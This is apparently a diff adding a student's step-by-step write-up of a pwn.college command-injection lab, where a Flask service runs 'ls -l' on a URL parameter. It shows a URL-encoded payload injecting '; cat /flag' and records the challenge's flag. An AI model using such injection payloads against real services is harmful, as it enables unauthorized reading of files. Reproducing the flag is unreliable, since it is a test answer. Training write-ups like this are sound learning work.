@@ -1,0 +1,29 @@
+######################################## CMDi 1 ########################################
+
+1. looking at the server python script, can see it has a directory lister service
+	--> variable arg set to flask.request.args.get("dir", "/challenge")
+	--> variable command is set to f-string "ls -l {arg}"
+
+2. running curl -v http://challenge.localhost:80/resource shows ls -l for /challenge
+
+3. using a semicolon after curl will run the command after shutting down connection
+	--> this is because it runs the command after the curl query
+
+4. looking at ascii man page, the hexadecimal for semicolon is 3b
+	--> need to use %3b to place the semicolon in the link
+	--> for some reason %20 (space) and %2f (/) doesn't work
+
+5. the flask.request.args.get("dir", "/challenge") function have param values edited in link after inserting ? at end
+	--> example: to edit dir: http://challenge.localhost:80/resource?dir=/flag
+	--> example above showed ls -l for /flag
+
+6. using hexadecimal values for dir= shows the ascii symbols
+	--> http://challenge.localhost:80/resource?dir=%3b shows the ; in the command
+
+7. using curl -v http://challenge.localhost:80/resource?dir=%3b%63%61%74%20%2f%66%6c%61%67 shows the flag
+	--> changes the dir variable to '; cat /flag'
+	--> so the full executed command is 'ls -l ;cat /flag'
+
+8. flag for CMDi 1: pwn.college{AUA1tbm89Nhep0zdaUzAyRTZNOu.QX1YTN2wyN0gTN4EzW}
+
+########################################################################################
